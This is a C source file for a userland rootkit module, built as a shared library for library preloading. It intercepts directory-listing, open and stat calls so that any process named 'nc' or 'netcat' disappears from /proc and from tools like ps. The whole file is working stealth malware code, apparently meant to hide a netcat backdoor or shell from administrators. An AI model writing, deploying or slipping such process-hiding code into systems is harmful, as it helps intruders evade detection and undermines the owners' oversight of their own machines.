/*
gcc -shared -fPIC mod.c -o mod.so
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <dlfcn.h>
#include <dirent.h>
#include <errno.h>
#include <unistd.h>

// unsigned long blocked_pids[] = {102, 1001, 53, 896};
// #define DEBUG

#define get_og_func(var, name) \
    var = dlsym(RTLD_NEXT, name); \
    if(!var) { \
        fprintf(stderr, "Error loading symbol %s: %s\n", name, dlerror()); \
        exit(1); \
    }

#ifdef DEBUG
    #define debug(fmt, ...) printf(fmt, ##__VA_ARGS__);
#else
    #define debug(fmt, ...)
#endif

typedef struct stat stat_t;
typedef struct statx statx_t;

// References to original functions
DIR *(*og_opendir)(const char *dirname);
struct dirent *(*og_readdir)(DIR *dir);
struct dirent64 *(*og_readdir64)(DIR *dir);
int (*og_open)(const char *pathname, int flags, ...);
int (*og_openat)(int dirfd, const char *pathname, int flags, ...);
int (*og_stat)(const char *restrict path, stat_t *restrict statbuf);
int (*og_statx)(int dirfd, const char *restrict path, int flags, unsigned int mask, statx_t *restrict statxbuf);

bool is_blocked_pid(unsigned long pid){
    // for(size_t i = 0; i < sizeof(blocked_pids)/sizeof(blocked_pids[0]); i++){
    //     if(pid == blocked_pids[i])
    //         return true;
    // }
    // return false;

    // Get command and check for nc
    char path[64];
    sprintf(path, "/proc/%lu/comm", pid);
    
    FILE* f = fopen(path, "r");
    if(!f)
        return false;
    
    char comm[64];
    if(!fgets(comm, sizeof(comm), f)){
        fclose(f);
        return false;
    }
    fclose(f);

    // Remove newline
    comm[strcspn(comm, "\n")] = 0;

    debug("\tCommand: %s\n", comm);
    return strcmp(comm, "nc") == 0 || strcmp(comm, "netcat") == 0;
}

__attribute__((constructor))
void init(){
    get_og_func(og_opendir, "opendir")
    get_og_func(og_readdir, "readdir")
    get_og_func(og_readdir64, "readdir64")
    get_og_func(og_open, "open")
    get_og_func(og_openat, "openat")
    get_og_func(og_stat, "stat")
    get_og_func(og_statx, "statx")

    debug("Module loaded\n");
}

/*
 * Get a directory name given a DIR* handle
 */
static int get_dir_name(DIR* dirp, char* buf, size_t size)
{
    int fd = dirfd(dirp);
    if(fd == -1) {
        return 0;
    }

    char tmp[64];
    snprintf(tmp, sizeof(tmp), "/proc/self/fd/%d", fd);
    ssize_t ret = readlink(tmp, buf, size);
    if(ret == -1) {
        return 0;
    }

    buf[ret] = 0;
    return 1;
}

bool is_hidden_path(const char* path) {
    char real_path[PATH_MAX];
    if(!realpath(path, real_path))
        return false;

    debug("\tReal path: %s\n", real_path);

    if(strncmp(real_path, "/proc/", 6) != 0)
        return false;

    errno = 0;
    unsigned long pid = strtoul(real_path + 6, NULL, 10); 
    if(errno)
        return false;

    if(!is_blocked_pid(pid))
        return false;
    
    debug("\tBlocked PID: %lu\n", pid);
    return true;
}

DIR* opendir(const char *name) {
    debug("opendir(%s)\n", name);

    if(!is_hidden_path(name))
        return og_opendir(name);
    
    errno = ENOENT;
    return NULL;
}

int open(const char *pathname, int flags, ...) {
    debug("open(%s, %x)\n", pathname, flags);

    if(!is_hidden_path(pathname))
        return og_open(pathname, flags);
    
    errno = ENOENT;
    return -1;
}

int openat(int dirfd, const char *pathname, int flags, ...) {
    debug("openat(%d, %s, %x)\n", dirfd, pathname, flags);

    if(!is_hidden_path(pathname))
        return og_openat(dirfd, pathname, flags);
    
    errno = ENOENT;
    return -1;
}

int stat(const char *restrict path, stat_t *restrict statbuf){
    debug("stat(%s, %p)\n", path, statbuf);

    if(!is_hidden_path(path))
        return og_stat(path, statbuf); 
    
    errno = ENOENT;
    return -1;
}

int statx(int dirfd, const char *restrict path,
                 int flags, unsigned int mask,
                statx_t *restrict statxbuf){
    debug("statx(%d, %s, %x, %x, %p)\n", dirfd, path, flags, mask, statxbuf);

    if(!is_hidden_path(path))
        return og_statx(dirfd, path, flags, mask, statxbuf);
    
    errno = ENOENT;
    return -1;
}

bool is_proc_dir(DIR *d){
    char path[64];
    if(!get_dir_name(d, path, sizeof(path)))
        return false;

    debug("\tDirectory path: %s\n", path);
    return strcmp(path, "/proc") == 0;
}

struct dirent *readdir(DIR *d){
    debug("readdir(%p)\n", d);

    if(!is_proc_dir(d))
        return og_readdir(d);

    // Read entries until we find one that is not blocked
    struct dirent* entry = og_readdir(d);
    if(!entry)
        return NULL;

    errno = 0;
    unsigned long pid = strtoul(entry->d_name, NULL, 10);
    if(errno)
        return entry;

    if(!is_blocked_pid(pid))
        return entry;

    debug("\tBlocked PID: %lu\n", pid);
    return readdir(d);
}

struct dirent64 *readdir64(DIR *d){
    debug("readdir64(%p)\n", d);

    if(!is_proc_dir(d))
        return og_readdir64(d);

    // Read entries until we find one that is not blocked
    struct dirent64* entry = og_readdir64(d);
    if(!entry)
        return NULL;

    errno = 0;
    unsigned long pid = strtoul(entry->d_name, NULL, 10);
    if(errno)
        return entry;

    if(!is_blocked_pid(pid))
        return entry;

    debug("\tBlocked PID: %lu\n", pid);
    return readdir64(d);
}